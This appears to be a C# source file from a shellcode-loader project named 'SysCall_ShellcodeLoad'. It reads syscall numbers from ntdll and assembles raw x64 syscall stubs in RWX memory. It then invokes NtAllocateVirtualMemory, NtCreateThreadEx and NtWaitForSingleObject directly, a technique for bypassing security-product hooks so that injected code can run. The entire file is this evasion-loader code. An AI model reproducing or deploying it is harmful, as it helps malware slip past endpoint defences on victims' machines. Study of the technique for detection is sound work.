using System;
using System.Collections.Generic;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;
using System.Runtime.InteropServices;
using System.ComponentModel;
using System.Diagnostics;


namespace SysCall_ShellcodeLoad
{
    class Auto_NativeCode
    {
		[DllImport("kernel32.dll")]
		public static extern bool VirtualProtectEx
		(
			IntPtr hProcess,
			IntPtr lpAddress,
			UIntPtr dwSize,
			uint flNewProtect,
			out uint lpflOldProtect
		 );

		[DllImport("kernel32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
		static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

		[DllImport("kernel32.dll", CharSet = CharSet.Auto)]
		public static extern IntPtr GetModuleHandle(string lpModuleName);

		[DllImport("kernel32.dll", SetLastError = true)]
		public static extern IntPtr GetCurrentProcess();

		[DllImport("kernel32.dll")]
		public static extern void RtlZeroMemory(IntPtr pBuffer, int length);

		[DllImport("kernel32.dll", SetLastError = true)]
		static extern bool ReadProcessMemory(
			IntPtr hProcess,
			IntPtr lpBaseAddress,
			IntPtr lpBuffer,
			int dwSize,
			out uint lpNumberOfBytesRead
		);

		public uint NTSTATUS;
		public static UInt32 PAGE_EXECUTE_READWRITE = 0x40;

		// public uint SYSid = 0;
		public static byte[] SYSbyte1 =
		{
			0x4c, 0x8b, 0xd1,               
            0xb8
		};

		public static byte[] SYSbyte2 =
		{ 
			0x00, 0x00, 0x00,  
            0x0F, 0x05,                    
            0xC3                           
        };

		public enum AllocationType : ulong
		{
			Commit = 0x1000,
			Reserve = 0x2000,
			Decommit = 0x4000,
			Release = 0x8000,
			Reset = 0x80000,
			Physical = 0x400000,
			TopDown = 0x100000,
			WriteWatch = 0x200000,
			LargePages = 0x20000000
		}


		public static uint GetSyscallID(string SysFunName)
        {
			uint SyscallID = 0;
			IntPtr SyscallID_mem = Marshal.AllocHGlobal(Marshal.SizeOf(SyscallID));
			RtlZeroMemory(SyscallID_mem, Marshal.SizeOf(SyscallID));

			IntPtr hModule = GetModuleHandle("ntdll.dll");
			IntPtr FunAddr = GetProcAddress(hModule, SysFunName);
			IntPtr CallAddr = FunAddr + 4;

			uint temp;
			bool read_result = ReadProcessMemory(GetCurrentProcess(), CallAddr, SyscallID_mem, 4, out temp);
			// Console.WriteLine("Error: " + Marshal.GetLastWin32Error());
			// Console.WriteLine("CallAddr：" + CallAddr + ", SyscallID" + SyscallID + ", temp: " + temp);

			SyscallID = (uint)Marshal.ReadInt32(SyscallID_mem);
			return SyscallID;
        }

		public static uint NtAllocateVirtualMemory
		(
			IntPtr ProcessHandle,
			ref IntPtr BaseAddress,
			IntPtr ZeroBits,
			ref UIntPtr RegionSize,
			uint AllocationType,
			uint Protect
		)
		{
			// set byte array of bNtAllocateVirtualMemory to new byte array called syscall
			uint SyscallID = Auto_NativeCode.GetSyscallID("NtAllocateVirtualMemory");
			byte[] syscall1 = SYSbyte1;
			byte[] syscallid = { (byte)SyscallID };
			byte[] syscall2 = SYSbyte2;
			byte[] sysfinal = syscall1.Concat(syscallid).Concat(syscall2).ToArray();

			/*
			foreach(byte temp in sysfinal)
            {
				Console.WriteLine("Sysfinal: " + temp);
			}
			*/

			// specify unsafe context
			unsafe
			{
				// create new byte pointer and set value to our syscall byte array
				fixed (byte* ptr = sysfinal)
				{
					// cast the byte array pointer into a C# IntPtr called memoryAddress
					IntPtr memoryAddress = (IntPtr)ptr;

					// Change memory access to RX for our assembly code
					if (!VirtualProtectEx(Process.GetCurrentProcess().Handle, memoryAddress, (UIntPtr)sysfinal.Length, PAGE_EXECUTE_READWRITE, out uint oldprotect))
					{
						throw new Win32Exception();
					}

					// Get delegate for NtAllocateVirtualMemory
					DelegatesStruct.NtAllocateVirtualMemory assembledFunction = (DelegatesStruct.NtAllocateVirtualMemory)Marshal.GetDelegateForFunctionPointer(memoryAddress, typeof(DelegatesStruct.NtAllocateVirtualMemory));

					return (uint)assembledFunction(
						ProcessHandle,
						ref BaseAddress,
						ZeroBits,
						ref RegionSize,
						AllocationType,
						Protect);
				}
			}

		}

		public static uint NtCreateThreadEx
	  (
		  out IntPtr hThread,
		  uint DesiredAccess,
		  IntPtr ObjectAttributes,
		  IntPtr ProcessHandle,
		  IntPtr lpStartAddress,
		  IntPtr lpParameter,
		  bool CreateSuspended,
		  uint StackZeroBits,
		  uint SizeOfStackCommit,
		  uint SizeOfStackReserve,
		  IntPtr lpBytesBuffer
	  )
		{
			// set byte array of bNtCreateThread to new byte array called syscall

			uint SyscallID = Auto_NativeCode.GetSyscallID("NtCreateThreadEx");
			byte[] syscall1 = SYSbyte1;
			byte[] syscallid = { (byte)SyscallID };
			byte[] syscall2 = SYSbyte2;
			byte[] sysfinal = syscall1.Concat(syscallid).Concat(syscall2).ToArray();

			// specify unsafe context
			unsafe
			{
				// create new byte pointer and set value to our syscall byte array
				fixed (byte* ptr = sysfinal)
				{
					// cast the byte array pointer into a C# IntPtr called memoryAddress
					IntPtr memoryAddress = (IntPtr)ptr;

					// Change memory access to RX for our assembly code
					if (!VirtualProtectEx(Process.GetCurrentProcess().Handle, memoryAddress, (UIntPtr)sysfinal.Length, PAGE_EXECUTE_READWRITE, out uint oldprotect))
					{
						throw new Win32Exception();
					}

					// Get delegate for NtCreateThread
					DelegatesStruct.NtCreateThreadEx assembledFunction = (DelegatesStruct.NtCreateThreadEx)Marshal.GetDelegateForFunctionPointer(memoryAddress, typeof(DelegatesStruct.NtCreateThreadEx));

					return (uint)assembledFunction(
						out hThread,
						DesiredAccess,
						ObjectAttributes,
						ProcessHandle,
						lpStartAddress,
						lpParameter,
						CreateSuspended,
						StackZeroBits,
						SizeOfStackCommit,
						SizeOfStackReserve,
						lpBytesBuffer
					 );
				}
			}
		}

		public static uint NtWaitForSingleObject(IntPtr Object, bool Alertable, uint Timeout)
		{
			// set byte array of bNtWaitForSingleObject to new byte array called syscall

			uint SyscallID = Auto_NativeCode.GetSyscallID("NtWaitForSingleObject");
			byte[] syscall1 = SYSbyte1;
			byte[] syscallid = { (byte)SyscallID };
			byte[] syscall2 = SYSbyte2;
			byte[] sysfinal = syscall1.Concat(syscallid).Concat(syscall2).ToArray();

			// specify unsafe context
			unsafe
			{
				// create new byte pointer and set value to our syscall byte array
				fixed (byte* ptr = sysfinal)
				{
					// cast the byte array pointer into a C# IntPtr called memoryAddress
					IntPtr memoryAddress = (IntPtr)ptr;

					// Change memory access to RX for our assembly code
					if (!VirtualProtectEx(Process.GetCurrentProcess().Handle, memoryAddress, (UIntPtr)sysfinal.Length, PAGE_EXECUTE_READWRITE, out uint oldprotect))
					{
						throw new Win32Exception();
					}

					// Get delegate for NtWaitForSingleObject
					DelegatesStruct.NtWaitForSingleObject assembledFunction = (DelegatesStruct.NtWaitForSingleObject)Marshal.GetDelegateForFunctionPointer(memoryAddress, typeof(DelegatesStruct.NtWaitForSingleObject));

					return (uint)assembledFunction(Object, Alertable, Timeout);
				}
			}
		}


		public struct DelegatesStruct
		{
			[UnmanagedFunctionPointer(CallingConvention.StdCall)]
			public delegate uint NtAllocateVirtualMemory(
				IntPtr ProcessHandle,
				ref IntPtr BaseAddress,
				IntPtr ZeroBits,
				ref UIntPtr RegionSize,
				ulong AllocationType,
				ulong Protect);
			[UnmanagedFunctionPointer(CallingConvention.StdCall)]
			public delegate uint NtCreateThreadEx(
				out IntPtr hThread,
				uint DesiredAccess,
				IntPtr ObjectAttributes,
				IntPtr ProcessHandle,
				IntPtr lpStartAddress,
				IntPtr lpParameter,
				bool CreateSuspended,
				uint StackZeroBits,
				uint SizeOfStackCommit,
				uint SizeOfStackReserve,
				IntPtr lpBytesBuffer
				);
			[UnmanagedFunctionPointer(CallingConvention.StdCall)]
			public delegate uint NtWaitForSingleObject(IntPtr Object, bool Alertable, uint Timeout);
		}

	}
}
